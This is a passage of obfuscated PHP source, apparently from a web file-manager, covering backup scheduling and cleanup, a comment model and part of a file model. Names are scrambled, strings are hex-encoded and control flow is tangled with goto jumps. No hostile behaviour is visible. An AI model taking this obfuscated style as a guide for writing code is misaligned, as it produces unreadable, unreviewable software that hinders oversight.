$FÆÌğİä†‰ =& $_SERVER[åÌÛ»ô¢‚ö™]; $dŸÒŒÛƒ›² = Model($FÆÌğİä†‰[715])->config(); if ($aõêà¯¢µ && $dŸÒŒÛƒ›²[$FÆÌğİä†‰[718]] != $aõêà¯¢µ) { $B‹‚’Û‘ªÒ = 0; } goto D‹Ñ’¡¨ŠŸ; F¥˜¤¬‚: } private function checkStore($EéĞË¢©Â) { $A¯š¾™Ş‘Ü =& $_SERVER[åÌÛ»ô¢‚ö™]; $D×”‰ÑåÄ = Model($A¯š¾™Ş‘Ü[730])->listData($EéĞË¢©Â); Model($A¯š¾™Ş‘Ü[730])->checkConfig($D×”‰ÑåÄ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[åÌÛ»ô¢‚ö™][715])->findByName(self::$name); } return self::$option; } public static function set($BøÌ‹¸¥Î) { $EÏÈ…º²Ø‡ =& $_SERVER[åÌÛ»ô¢‚ö™]; $EÀ¨¡ÈëÑ¬ = self::get(); foreach ($BøÌ‹¸¥Î as $aô¢Ï–•Â => $A‰·Ò¤Ğ™ì) { $DÅøğóù² = explode($EÏÈ…º²Ø‡[91], $aô¢Ï–•Â); $DäŸÁ¿Õèº = count($DÅøğóù²); switch ($DäŸÁ¿Õèº) { case 1: $EÀ¨¡ÈëÑ¬[$DÅøğóù²[0]] = $A‰·Ò¤Ğ™ì; break; case 2: $EÀ¨¡ÈëÑ¬[$DÅøğóù²[0]][$DÅøğóù²[1]] = $A‰·Ò¤Ğ™ì; break; case 3: $EÀ¨¡ÈëÑ¬[$DÅøğóù²[0]][$DÅøğóù²[1]][$DÅøğóù²[2]] = $A‰·Ò¤Ğ™ì; break; } } Model($EÏÈ…º²Ø‡[715])->update($EÀ¨¡ÈëÑ¬[$EÏÈ…º²Ø‡[392]], $EÀ¨¡ÈëÑ¬); self::$option = $EÀ¨¡ÈëÑ¬; return self::$option; } public function keep() { $aÕÒ†Îˆ¼Ë =& $_SERVER[åÌÛ»ô¢‚ö™]; $DÂƒíÅËò = self::get(); if ($DÂƒíÅËò[$aÕÒ†Îˆ¼Ë[296]][$aÕÒ†Îˆ¼Ë[720]][$aÕÒ†Îˆ¼Ë[716]] == $aÕÒ†Îˆ¼Ë[83]) { return; } $this->backupKeep($DÂƒíÅËò); self::set(array($aÕÒ†Îˆ¼Ë[731] => 1)); } private function backupKeep($DíäÙ‘‹ªõ) { goto d³ÓÖ¹ãÆ; d³ÓÖ¹ãÆ: $ešÓÚÀë× =& $_SERVER[åÌÛ»ô¢‚ö™]; $bÛ¬ãØİˆ¬ = Model($ešÓÚÀë×[715])->listData(); if (empty($bÛ¬ãØİˆ¬)) { return; } goto CÀí¬»àÕ©; bÔéîØš†Ğ: for ($A£„ˆ’±Ÿ = 0; $A£„ˆ’±Ÿ < 12; $A£„ˆ’±Ÿ++) { $c„·ï¤ì»å[] = date($ešÓÚÀë×[732], strtotime("\x2d{$A£„ˆ’±Ÿ}\40\155\x6f\x6e\x74\150\163")); } $c„·ï¤ì»å = array_unique($c„·ï¤ì»å); foreach ($bÛ¬ãØİˆ¬ as $B²á”ÑŸŠ) { if (!empty($B²á”ÑŸŠ[$ešÓÚÀë×[28]]) && in_array($B²á”ÑŸŠ[$ešÓÚÀë×[28]], $c„·ï¤ì»å)) { continue; } Model($ešÓÚÀë×[715])->remove($B²á”ÑŸŠ[$ešÓÚÀë×[392]]); $f·ğ¼íè¡æ = "\x7b\x69\157\72{$DíäÙ‘‹ªõ[$ešÓÚÀë×[718]]}\x7d\x2f\x64\x61\164\141\x62\x61\163\145\57\x62\x61\x63\153\x75\160\x5f{$B²á”ÑŸŠ[$ešÓÚÀë×[28]]}"; IO::remove($f·ğ¼íè¡æ, !1); } goto AÍŒŠä²É·; CÀí¬»àÕ©: $A£„ˆ’±Ÿ = 0; $c„·ï¤ì»å = array(); foreach ($bÛ¬ãØİˆ¬ as $B²á”ÑŸŠ) { if ($A£„ˆ’±Ÿ >= 7) { break; } $c„·ï¤ì»å[] = $B²á”ÑŸŠ[$ešÓÚÀë×[28]]; $A£„ˆ’±Ÿ++; } goto bÔéîØš†Ğ; AÍŒŠä²É·: } public function db() { goto Aë„ƒ›‡¥; AÚÁö†Ç´ê: $e‰·î„òá = new BackupDb(); if (!$e‰·î„òá->index()) { return !1; } self::set(array($EÙ¬©ì·[733] => 1)); goto c´ÃŒ´å›; c´ÃŒ´å›: return !0; goto aŒ“¦ÚÆ´ì; Aë„ƒ›‡¥: $EÙ¬©ì· =& $_SERVER[åÌÛ»ô¢‚ö™]; $FÕˆøëïÛÍ = self::get(); if ($FÕˆøëïÛÍ[$EÙ¬©ì·[296]][$EÙ¬©ì·[721]][$EÙ¬©ì·[716]] == $EÙ¬©ì·[83]) { return !0; } goto AÚÁö†Ç´ê; aŒ“¦ÚÆ´ì: } public function dbFile() { goto eëºË°Èî; c÷ª¿š¹Âª: $E´¨š“ÃÅá = new BackupDbFile(); if (!$E´¨š“ÃÅá->index()) { return !1; } self::set(array($e‘Ÿ‰›¼ò[734] => 1)); goto eßõÌ–—ö¥; eßõÌ–—ö¥: return !0; goto BÑŠ³Ô´¥‚; eëºË°Èî: $e‘Ÿ‰›¼ò =& $_SERVER[åÌÛ»ô¢‚ö™]; $Eôëí¾šğ³ = self::get(); if ($Eôëí¾šğ³[$e‘Ÿ‰›¼ò[296]][$e‘Ÿ‰›¼ò[724]][$e‘Ÿ‰›¼ò[716]] == $e‘Ÿ‰›¼ò[83]) { return !0; } goto c÷ª¿š¹Âª; BÑŠ³Ô´¥‚: } public function file() { $DÜ“¥ê¨˜„ =& $_SERVER[åÌÛ»ô¢‚ö™]; $dŒ§ƒ—‹­Ì = self::get(); if ($dŒ§ƒ—‹­Ì[$DÜ“¥ê¨˜„[296]][$DÜ“¥ê¨˜„[171]][$DÜ“¥ê¨˜„[716]] == $DÜ“¥ê¨˜„[83]) { return !0; } if (!isset($dŒ§ƒ—‹­Ì[$DÜ“¥ê¨˜„[719]]) || $dŒ§ƒ—‹­Ì[$DÜ“¥ê¨˜„[719]] == $DÜ“¥ê¨˜„[494]) { $b’¿è†­Ì£ = new BackupFile(); if (!$b’¿è†­Ì£->index()) { return !1; } } self::set(array($DÜ“¥ê¨˜„[735] => 1, $DÜ“¥ê¨˜„[716] => 1)); return !0; } } goto bÌ¦Ò¨Æ’™; b‘Ù¸¨ãŞ: class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\56\142\141\143\x6b\x75\160\114\151\x73\x74"; public $field = array("\151\x6f", "\x6e\x61\x6d\145", "\163\x74\141\164\165\x73", "\x63\157\156\x74\145\x6e\164", "\162\x65\x73\165\154\x74", "\164\x69\x6d\x65\x46\x72\157\x6d", "\164\x69\155\x65\124\x6f"); public function config() { goto e«£¦ ç; e«£¦ ç: $cÕèÛ«»•£ =& $_SERVER[åÌÛ»ô¢‚ö™]; $CÂøğ¡ã™† = Model($cÕèÛ«»•£[1114])->get($cÕèÛ«»•£[740]); $CÂøğ¡ã™† = json_decode($CÂøğ¡ã™†, !0); goto F‚‘Å‚ÌŞè; FºÑƒÍŞ: Action($cÕèÛ«»•£[2161])->taskInit(); $E«ä×ÛÕÁ = Model($cÕèÛ«»•£[2162])->listData(); foreach ($E«ä×ÛÕÁ as $B¢·’»Âˆ) { if ($B¢·’»Âˆ[$cÕèÛ«»•£[1106]] == $cÕèÛ«»•£[83] && $B¢·’»Âˆ[$cÕèÛ«»•£[1454]] == $cÕèÛ«»•£[2163]) { $eĞ˜ß‡÷Êà = $B¢·’»Âˆ; break; } } goto Dç°ŞøÛ¤™; F‚‘Å‚ÌŞè: $CÂøğ¡ã™† = is_array($CÂøğ¡ã™†) ? $CÂøğ¡ã™† : array(); if (!isset($CÂøğ¡ã™†[$cÕèÛ«»•£[719]])) { $CÂøğ¡ã™†[$cÕèÛ«»•£[719]] = $cÕèÛ«»•£[83]; } $eĞ˜ß‡÷Êà = array(); goto FºÑƒÍŞ; Dç°ŞøÛ¤™: if (isset($eĞ˜ß‡÷Êà[$cÕèÛ«»•£[203]])) { $eĞ˜ß‡÷Êà[$cÕèÛ«»•£[203]] = json_decode($eĞ˜ß‡÷Êà[$cÕèÛ«»•£[203]], !0); } if (isset($CÂøğ¡ã™†[$cÕèÛ«»•£[203]])) { $eĞ˜ß‡÷Êà[$cÕèÛ«»•£[203]][$cÕèÛ«»•£[1439]] = $CÂøğ¡ã™†[$cÕèÛ«»•£[203]]; unset($CÂøğ¡ã™†[$cÕèÛ«»•£[203]]); } return array_merge($eĞ˜ß‡÷Êà, $CÂøğ¡ã™†); goto AªÖŞêˆêß; AªÖŞêˆêß: } public function listData($A“ÔÑŸåÜâ = false, $eîİ¾êí‰Ù = "\155\157\144\151\x66\171\x54\151\155\145", $AÙì¥ÌÎëÚ = false) { return parent::listData($A“ÔÑŸåÜâ, $eîİ¾êí‰Ù, !0); } public function lastItem() { $AÒÅ„çè°é = $this->listData(); return !empty($AÒÅ„çè°é[0]) ? $AÒÅ„çè°é[0] : null; } public function kill($eôÃóêó) { goto b†›â‘ÓéÅ; eØ¡Œ÷¢æ†: Task::kill($e©ãÔ¯‘£[739]); Task::kill($e©ãÔ¯‘£[755]); Task::kill($e©ãÔ¯‘£[763]); goto EŠéÀ®¢ò†; e¡æÇ’­ìÍ: return $this->remove($eôÃóêó); goto F©ÄïİÄ‡; EŠéÀ®¢ò†: $D‰˜‚ŠğøÅ = $a¾¸¬²¿†À[$e©ãÔ¯‘£[28]]; $Aò¯·ŒÚô = TEMP_FILES . $e©ãÔ¯‘£[736] . $D‰˜‚ŠğøÅ . $e©ãÔ¯‘£[8]; IO::remove($Aò¯·ŒÚô, !1); goto e¡æÇ’­ìÍ; b†›â‘ÓéÅ: $e©ãÔ¯‘£ =& $_SERVER[åÌÛ»ô¢‚ö™]; $a¾¸¬²¿†À = $this->listData($eôÃóêó); if (!$a¾¸¬²¿†À || empty($a¾¸¬²¿†À[$e©ãÔ¯‘£[28]])) { return !0; } goto eØ¡Œ÷¢æ†; F©ÄïİÄ‡: } public function remove($Bßßƒ«òí§) { $bÌĞÎè‹ = $this->listData($Bßßƒ«òí§); if (!$bÌĞÎè‹) { return !0; } return $this->backupRemove($bÌĞÎè‹); } private function backupRemove($CÔêªí¯Âƒ) { $EÂé—ÕŸ‘‘ =& $_SERVER[åÌÛ»ô¢‚ö™]; parent::remove($CÔêªí¯Âƒ[$EÂé—ÕŸ‘‘[392]]); $bÊ¹ğøù¹¼ = "\173\151\157\72{$CÔêªí¯Âƒ[$EÂé—ÕŸ‘‘[718]]}\x7d\57\144\141\x74\141\x62\x61\x73\145\x2f\142\141\143\x6b\x75\160\137" . $CÔêªí¯Âƒ[$EÂé—ÕŸ‘‘[28]]; IO::remove($bÊ¹ğøù¹¼, !1); return !0; } public function start() { goto D‘ô­˜ÒÜá; CŸ£ÑÒÙ¹Ê: if (!$fè‡›Á¡ÏÔ || $fè‡›Á¡ÏÔ[$BÓïºÊÂŒ[1436]] != $BÓïºÊÂŒ[83]) { return !1; } $eõŒ“ÈœâÀ = $this->process(); foreach ($eõŒ“ÈœâÀ as $e‰Ë•¾·†â) { if ($e‰Ë•¾·†â) { return Task::restart($e‰Ë•¾·†â[$BÓïºÊÂŒ[392]]); } } goto d§–ÈÃô™Å; d§–ÈÃô™Å: $BïŠ”ù‡Ÿ = new Backup(); $BïŠ”ù‡Ÿ->keep(); if (!$BïŠ”ù‡Ÿ->db()) { return !1; } goto C§Š¬×¬‰; D‘ô­˜ÒÜá: $BÓïºÊÂŒ =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($GLOBALS[$BÓïºÊÂŒ[6]][$BÓïºÊÂŒ[84]][$BÓïºÊÂŒ[2164]] != $BÓïºÊÂŒ[83]) { return !0; } $fè‡›Á¡ÏÔ = $this->config(); goto CŸ£ÑÒÙ¹Ê; C§Š¬×¬‰: if (!$BïŠ”ù‡Ÿ->dbFile()) { return !1; } if ($fè‡›Á¡ÏÔ[$BÓïºÊÂŒ[719]] == $BÓïºÊÂŒ[494]) { $BïŠ”ù‡Ÿ->file(); } Backup::set(array($BÓïºÊÂŒ[716] => 1, $BÓïºÊÂŒ[473] => time())); goto fÖŠƒ“Ø¤; fÖŠƒ“Ø¤: return !0; goto cŒê­é¦¡; cŒê­é¦¡: } public function process() { $fÚŸ†‘›‡‰ =& $_SERVER[åÌÛ»ô¢‚ö™]; return array($fÚŸ†‘›‡‰[721] => Task::get($fÚŸ†‘›‡‰[739]), $fÚŸ†‘›‡‰[724] => Task::get($fÚŸ†‘›‡‰[755]), $fÚŸ†‘›‡‰[171] => Task::get($fÚŸ†‘›‡‰[763])); } public function restore() { $cğª²óÔÓ› =& $_SERVER[åÌÛ»ô¢‚ö™]; ActionCall($cğª²óÔÓ›[996], !0, 1); ActionCall($cğª²óÔÓ›[996], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\157\x6d\155\x65\156\x74"; protected $tableMeta = array("\x74\x61\x62\154\x65\x4e\x61\155\x65" => "\143\157\155\x6d\145\x6e\164\137\155\145\x74\x61", "\x6d\145\164\x61\x46\151\x65\x6c\x64" => "\x63\157\x6d\155\145\x6e\164\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($F…Ìƒ’Ñš ) { $B”ÑàÃ…Ù³ =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($F…Ìƒ’Ñš [$B”ÑàÃ…Ù³[2165]]) { $EÜ‘Œ±º° = $this->where(array($B”ÑàÃ…Ù³[2166] => $F…Ìƒ’Ñš [$B”ÑàÃ…Ù³[2165]]))->find(); if (!$EÜ‘Œ±º° || $EÜ‘Œ±º°[$B”ÑàÃ…Ù³[396]] != $F…Ìƒ’Ñš [$B”ÑàÃ…Ù³[396]] || $EÜ‘Œ±º°[$B”ÑàÃ…Ù³[482]] != $F…Ìƒ’Ñš [$B”ÑàÃ…Ù³[482]]) { return !1; } $this->where(array($B”ÑàÃ…Ù³[2166] => $F…Ìƒ’Ñš [$B”ÑàÃ…Ù³[2165]]))->setAdd($B”ÑàÃ…Ù³[2167], 1); } $F…Ìƒ’Ñš [$B”ÑàÃ…Ù³[2168]] = 0; $F…Ìƒ’Ñš [$B”ÑàÃ…Ù³[2167]] = 0; $F…Ìƒ’Ñš [$B”ÑàÃ…Ù³[716]] = 1; return $this->add($F…Ìƒ’Ñš ); } public function remove($A¤ËŸÓ‹Æø) { $c÷ŠğÀÅÎ =& $_SERVER[åÌÛ»ô¢‚ö™]; $F¶é‚£Ş÷¡ = array($c÷ŠğÀÅÎ[2166] => $A¤ËŸÓ‹Æø); $b¯–Û´Ùõñ = $this->where($F¶é‚£Ş÷¡)->find(); if ($b¯–Û´Ùõñ[$c÷ŠğÀÅÎ[2165]]) { $this->where(array($c÷ŠğÀÅÎ[2166] => $b¯–Û´Ùõñ[$c÷ŠğÀÅÎ[2165]]))->setAdd($c÷ŠğÀÅÎ[2167], -1); } return $this->where($F¶é‚£Ş÷¡)->delete(); } public function edit($d“¼ÕŠœ¾ò, $CÕ¯Ò»ò÷•) { $EÉƒ‰ÖÏì =& $_SERVER[åÌÛ»ô¢‚ö™]; $eã½áßè¶ = array($EÉƒ‰ÖÏì[2166] => $d“¼ÕŠœ¾ò); return $this->where($eã½áßè¶)->save(array($EÉƒ‰ÖÏì[2169] => $CÕ¯Ò»ò÷•)); } public function prasise($dè£ÏÛ™‚ó) { $fÜÉïõ =& $_SERVER[åÌÛ»ô¢‚ö™]; $eÑí„ÈØÁœ = Model($fÜÉïõ[2170]); $Cäñ¦´©ˆ = array($fÜÉïõ[2166] => $dè£ÏÛ™‚ó, $fÜÉïõ[1457] => USER_ID); $e¹×ÇŞ©ˆ = $eÑí„ÈØÁœ->where($Cäñ¦´©ˆ)->find(); if (!$e¹×ÇŞ©ˆ) { $eÑí„ÈØÁœ->add($Cäñ¦´©ˆ); $c ÔÏô±¢ = $this->where(array($fÜÉïõ[2166] => $dè£ÏÛ™‚ó))->setAdd($fÜÉïõ[2168], 1); } else { $eÑí„ÈØÁœ->where($Cäñ¦´©ˆ)->delete(); $c ÔÏô±¢ = $this->where(array($fÜÉïõ[2166] => $dè£ÏÛ™‚ó))->setAdd($fÜÉïõ[2168], -1); } return $c ÔÏô±¢; } public function targetInfo($B“¸¾´ë±, $EßÆ Åù²Õ) { goto a’ù‚‚õÓ—; a’ù‚‚õÓ—: $f¨÷Œª§ƒØ =& $_SERVER[åÌÛ»ô¢‚ö™]; $C«ÈåÎŸ³Á = array($f¨÷Œª§ƒØ[547] => $B“¸¾´ë±, $f¨÷Œª§ƒØ[548] => $EßÆ Åù²Õ); $cåêàÜŸê = $this->where($C«ÈåÎŸ³Á)->count(); goto d£ˆ›Ê«ÄÆ; d£ˆ›Ê«ÄÆ: $D’ŞÎß‚Œß = "\x52\x49\107\110\x54\40\112\x4f\x49\116\x20{$this->tablePrefix}\x63\157\155\155\145\156\x74\137\x70\x72\x61\x69\163\145\40\x73\164\x61\162\x20\x6f\x6e\x20\143\157\x6d\155\145\x6e\x74\x2e\x63\157\x6d\x6d\145\156\x74\111\x44\x20\x3d\40\163\x74\x61\x72\x2e\143\157\x6d\155\145\x6e\x74\111\x44"; $bíÀ•“‚á§ = $this->alias($f¨÷Œª§ƒØ[357])->where($C«ÈåÎŸ³Á)->join($D’ŞÎß‚Œß, $f¨÷Œª§ƒØ[2171])->count(); $Bá÷êêÛÉ = array($f¨÷Œª§ƒØ[2172] => $cåêàÜŸê, $f¨÷Œª§ƒØ[2173] => $bíÀ•“‚á§); goto CÀ¯Œ‘„ŞŒ; CÀ¯Œ‘„ŞŒ: return $Bá÷êêÛÉ; goto E‡ïù‘ÆÄÓ; E‡ïù‘ÆÄÓ: } public function listData($EåøøÈĞ³) { $F–Ü„’ÆË¤ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (isset($EåøøÈĞ³[$F–Ü„’ÆË¤[2174]])) { if ($EåøøÈĞ³[$F–Ü„’ÆË¤[2174]]) { $EåøøÈĞ³[$F–Ü„’ÆË¤[2175]] = array($F–Ü„’ÆË¤[949], intval($EåøøÈĞ³[$F–Ü„’ÆË¤[2174]])); } unset($EåøøÈĞ³[$F–Ü„’ÆË¤[2174]]); } if (isset($EåøøÈĞ³[$F–Ü„’ÆË¤[2176]])) { if ($EåøøÈĞ³[$F–Ü„’ÆË¤[2176]]) { $EåøøÈĞ³[$F–Ü„’ÆË¤[2175]] = array($F–Ü„’ÆË¤[946], intval($EåøøÈĞ³[$F–Ü„’ÆË¤[2176]])); } unset($EåøøÈĞ³[$F–Ü„’ÆË¤[2176]]); } return $this->_listData($EåøøÈĞ³); } private function _listData($fì—à‹¼¶Á) { $FãĞîîÓ”è =& $_SERVER[åÌÛ»ô¢‚ö™]; $D°”½Ã“œŞ = $this->where($fì—à‹¼¶Á)->_makeOrder()->selectPage(100); $this->_listAppendParent($D°”½Ã“œŞ[$FãĞîîÓ”è[370]]); $this->_listAppendUser($D°”½Ã“œŞ[$FãĞîîÓ”è[370]]); $this->_listAppendMeta($D°”½Ã“œŞ[$FãĞîîÓ”è[370]]); return $D°”½Ã“œŞ; } private function _makeOrder() { $C¼Ò‘œ–¶ğ =& $_SERVER[åÌÛ»ô¢‚ö™]; $dÍ‰’°Ò§Å = array($C¼Ò‘œ–¶ğ[2168], $C¼Ò‘œ–¶ğ[2167], $C¼Ò‘œ–¶ğ[200]); $d‘Â„Äàô = Input::get($C¼Ò‘œ–¶ğ[432], $C¼Ò‘œ–¶ğ[7], $C¼Ò‘œ–¶ğ[414], $dÍ‰’°Ò§Å); $B©¢ˆÁêÓ¸ = Input::get($C¼Ò‘œ–¶ğ[433], $C¼Ò‘œ–¶ğ[7], $C¼Ò‘œ–¶ğ[1459], array($C¼Ò‘œ–¶ğ[2177], $C¼Ò‘œ–¶ğ[430])); $F‡ÅÅŒš„½ = $d‘Â„Äàô . $C¼Ò‘œ–¶ğ[50] . $B©¢ˆÁêÓ¸; return $this->order($F‡ÅÅŒš„½); } private function _listAppendParent(&$d½’¢Î©ø) { goto aĞ´Ê„¦¸; F¤…ˆ£È…í: foreach ($d½’¢Î©ø as &$D„ƒÍ¨‹¼¶) { if (isset($BÇ†„ÒöÛ[$D„ƒÍ¨‹¼¶[$a›šùÕĞ[2165]]])) { $D„ƒÍ¨‹¼¶[$a›šùÕĞ[2178]] = $BÇ†„ÒöÛ[$D„ƒÍ¨‹¼¶[$a›šùÕĞ[2165]]]; } } unset($D„ƒÍ¨‹¼¶); goto AÉ³§Õ÷‡Ş; aĞ´Ê„¦¸: $a›šùÕĞ =& $_SERVER[åÌÛ»ô¢‚ö™]; $eŞ†˜›¤£ø = array_unique(array_to_keyvalue($d½’¢Î©ø, $a›šùÕĞ[33], $a›šùÕĞ[2165])); $eŞ†˜›¤£ø = array_remove_value($eŞ†˜›¤£ø, $a›šùÕĞ[494]); goto D™³é¯…Ç; D™³é¯…Ç: if (!$eŞ†˜›¤£ø) { return; } $BÇ†„ÒöÛ = $this->where(array($a›šùÕĞ[2166] => array($a›šùÕĞ[7], $eŞ†˜›¤£ø)))->select(); $BÇ†„ÒöÛ = array_to_keyvalue($BÇ†„ÒöÛ, $a›šùÕĞ[2175]); goto F¤…ˆ£È…í; AÉ³§Õ÷‡Ş: } private function _listAppendUser(&$Bíö¶ºì™Î) { goto c¨¥Êš¦¢æ; A—‡ñŸÉ±: foreach ($Bíö¶ºì™Î as &$C ‡Äëª­) { $C ‡Äëª­[$c¸ßªéÀ‰Æ[560]] = $Cœƒº¿«¯[$C ‡Äëª­[$c¸ßªéÀ‰Æ[1465]]]; if (isset($C ‡Äëª­[$c¸ßªéÀ‰Æ[2178]])) { $C ‡Äëª­[$c¸ßªéÀ‰Æ[2178]][$c¸ßªéÀ‰Æ[560]] = $Cœƒº¿«¯[$C ‡Äëª­[$c¸ßªéÀ‰Æ[2178]][$c¸ßªéÀ‰Æ[1465]]]; } } unset($C ‡Äëª­); goto C–“…œÄ™¾; c¨¥Êš¦¢æ: $c¸ßªéÀ‰Æ =& $_SERVER[åÌÛ»ô¢‚ö™]; $B—‡Œ×‘Äó = array_unique(array_to_keyvalue($Bíö¶ºì™Î, $c¸ßªéÀ‰Æ[33], $c¸ßªéÀ‰Æ[1465])); $B—‡Œ×‘Äó = array_remove_value($B—‡Œ×‘Äó, $c¸ßªéÀ‰Æ[494]); goto EÄƒ‰Á©; EÄƒ‰Á©: if (count($B—‡Œ×‘Äó) == 0) { return; } foreach ($Bíö¶ºì™Î as $C ‡Äëª­) { if (isset($C ‡Äëª­[$c¸ßªéÀ‰Æ[2178]])) { $B—‡Œ×‘Äó[] = $C ‡Äëª­[$c¸ßªéÀ‰Æ[2178]][$c¸ßªéÀ‰Æ[1465]]; } } $Cœƒº¿«¯ = Model($c¸ßªéÀ‰Æ[503])->userListInfo($B—‡Œ×‘Äó); goto A—‡ñŸÉ±; C–“…œÄ™¾: } private function _listAppendMeta(&$D²¦óÔèÊ) { goto A¬±„ÇµÜ¹; fœìŞ˜õŠø: if (!$A¾Š‹¬–İ†) { return; } foreach ($D²¦óÔèÊ as $EÁ˜ª–Üæ…) { if (isset($EÁ˜ª–Üæ…[$eˆ—‹¹›¹·[2178]])) { $A¾Š‹¬–İ†[] = $EÁ˜ª–Üæ…[$eˆ—‹¹›¹·[2178]][$eˆ—‹¹›¹·[2175]]; } } $C°ˆÅŒÛÙ• = $this->metaList($A¾Š‹¬–İ†); goto d®Ò’†ãğ; d®Ò’†ãğ: if (!$C°ˆÅŒÛÙ•) { return !1; } foreach ($D²¦óÔèÊ as &$EÁ˜ª–Üæ…) { $EÁ˜ª–Üæ…[$eˆ—‹¹›¹·[442]] = $C°ˆÅŒÛÙ•[$EÁ˜ª–Üæ…[$eˆ—‹¹›¹·[2175]]]; if (isset($EÁ˜ª–Üæ…[$eˆ—‹¹›¹·[2178]])) { $EÁ˜ª–Üæ…[$eˆ—‹¹›¹·[2178]][$eˆ—‹¹›¹·[442]] = $C°ˆÅŒÛÙ•[$EÁ˜ª–Üæ…[$eˆ—‹¹›¹·[2178]][$eˆ—‹¹›¹·[2175]]]; } } unset($EÁ˜ª–Üæ…); goto F¤’†œàƒò; A¬±„ÇµÜ¹: $eˆ—‹¹›¹· =& $_SERVER[åÌÛ»ô¢‚ö™]; $A¾Š‹¬–İ† = array_unique(array_to_keyvalue($D²¦óÔèÊ, $eˆ—‹¹›¹·[33], $eˆ—‹¹›¹·[2175])); $A¾Š‹¬–İ† = array_remove_value($A¾Š‹¬–İ†, $eˆ—‹¹›¹·[494]); goto fœìŞ˜õŠø; F¤’†œàƒò: } private function metaList($E‹–š¯Ÿ) { goto aâŠÅ¹—; aâŠÅ¹—: $bÒÙ©İµŞ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$E‹–š¯Ÿ) { return array(); } $A§ßœŸ‰« = array($bÒÙ©İµŞ[2175] => array($bÒÙ©İµŞ[7], $E‹–š¯Ÿ)); goto bÒë¼´èÑ‡; bÒë¼´èÑ‡: $a…„Ì„ˆ = Model($bÒÙ©İµŞ[2179])->where($A§ßœŸ‰«)->select(); $a…„Ì„ˆ = array_to_keyvalue_group($a…„Ì„ˆ, $bÒÙ©İµŞ[2175]); foreach ($a…„Ì„ˆ as $e‡ã³î‹ÅÉ => $CÒˆ‘¿È„å) { $f¶ ·½¾¥ = array(); foreach ($CÒˆ‘¿È„å as $a—òá‚Õ‚°) { $f¶ ·½¾¥[$a—òá‚Õ‚°[$bÒÙ©İµŞ[89]]] = $a—òá‚Õ‚°[$bÒÙ©İµŞ[375]]; } $a…„Ì„ˆ[$e‡ã³î‹ÅÉ] = $f¶ ·½¾¥; } goto Câ’’àÅ¯¡; Câ’’àÅ¯¡: return $a…„Ì„ˆ ? $a…„Ì„ˆ : array(); goto Fù¿•¦·É“; Fù¿•¦·É“: } } class FileModel extends ModelBase { protected $tableName = "\151\x6f\137\146\x69\154\x65"; protected $tableMeta = array("\164\x61\x62\x6c\145\116\x61\x6d\x65" => "\151\157\x5f\146\x69\x6c\x65\x5f\x6d\145\x74\141", "\155\145\x74\x61\x46\151\145\154\x64" => "\146\x69\154\x65\x49\104"); public function fileInfo($B¦¶ôÌ—Ğ—) { $DÈ†ÛØóÏ =& $_SERVER[åÌÛ»ô¢‚ö™]; static $cÕ¿‡ğ¢„Ö = array(); if (!isset($cÕ¿‡ğ¢„Ö[$B¦¶ôÌ—Ğ—])) { $aÃÆßƒºËŞ = $DÈ†ÛØóÏ[2180]; $däÎ¤¬î = Model($DÈ†ÛØóÏ[447])->field($aÃÆßƒºËŞ)->where(array($DÈ†ÛØóÏ[445] => $B¦¶ôÌ—Ğ—))->find(); $cÕ¿‡ğ¢„Ö[$B¦¶ôÌ—Ğ—] = $däÎ¤¬î; } return $cÕ¿‡ğ¢„Ö[$B¦¶ôÌ—Ğ—]; } public function addFileByContent($C×¿Û¨ŒñÂ = '', $FË×¤Ö×ˆ£ = '') { goto f¢¢§ï¦§¾; e©¡áÔ à: $aÆ—í«Ó = $F‹Ã„¥ßœ• . $DêËáˆ—Ì[2182] . rand_string(16); file_put_contents($aÆ—í«Ó, $C×¿Û¨ŒñÂ); $dÈôìãƒ¯ˆ = $this->addFile($aÆ—í«Ó, $FË×¤Ö×ˆ£, !0); goto DØâƒõß‡Ğ; f¢¢§ï¦§¾: $DêËáˆ—Ì =& $_SERVER[åÌÛ»ô¢‚ö™]; $F‹Ã„¥ßœ• = TEMP_PATH . $DêËáˆ—Ì[2181]; if (!is_dir($F‹Ã„¥ßœ•)) { mk_dir($F‹Ã„¥ßœ•); } goto e©¡áÔ à; DØâƒõß‡Ğ: if (file_exists($aÆ—í«Ó)) { @unlink($aÆ—í«Ó); } return $dÈôìãƒ¯ˆ; goto F‘¸¨öÄæß; F‘¸¨öÄæß: } public function createFileName($a¸ö„åğ‘á) { goto EÃÔŞ’Â‹µ; EÃÔŞ’Â‹µ: $fØµ«âÖÖ =& $_SERVER[åÌÛ»ô¢‚ö™]; $Eº±éìÆ‡è = IO::init($fØµ«âÖÖ[8]); $AöÒÔà³” = $this->makeFilePath($a¸ö„åğ‘á, $Eº±éìÆ‡è); goto dè×±äœ«; bÂÎŒÄ¶»ğ: if (!$aŒò‘´â‚¦ && !Cache::get($f¿¼ÀËš†)) { $aŒò‘´â‚¦ = !0; $dÓâ´Èèá‚ = IO::mkdir($a»œ¥´Ø×ª); if (!IO::exist($dÓâ´Èèá‚ . $fØµ«âÖÖ[2184])) { IO::mkfile($dÓâ´Èèá‚ . $fØµ«âÖÖ[2184]); } Cache::set($f¿¼ÀËš†, 1, 3600 * 2); } return $AöÒÔà³”; goto B—ññ½™ĞÚ; dè×±äœ«: $a»œ¥´Ø×ª = $Eº±éìÆ‡è->pathFather($AöÒÔà³”); static $aŒò‘´â‚¦ = false; $f¿¼ÀËš† = $fØµ«âÖÖ[2183] . md5($a»œ¥´Ø×ª); goto bÂÎŒÄ¶»ğ; B—ññ½™ĞÚ: } public function makeFilePath($b”‰Š”µé£, $B‡©…Éé£—) { goto aÙ«Ú Ûá¢; A´ïŸ½”ÕŞ: switch ($c›â÷ Ñ¹§) { case $c²ìÜÎ­ĞÎ[2188]: $bÎ±Ğô£‡ = $bÎ±Ğô£‡ . $c²ìÜÎ­ĞÎ[91] . $B‡©…Éé£—->ext($b”‰Š”µé£); if ($B‡©…Éé£—->ext($b”‰Š”µé£) == $c²ìÜÎ­ĞÎ[2128]) { 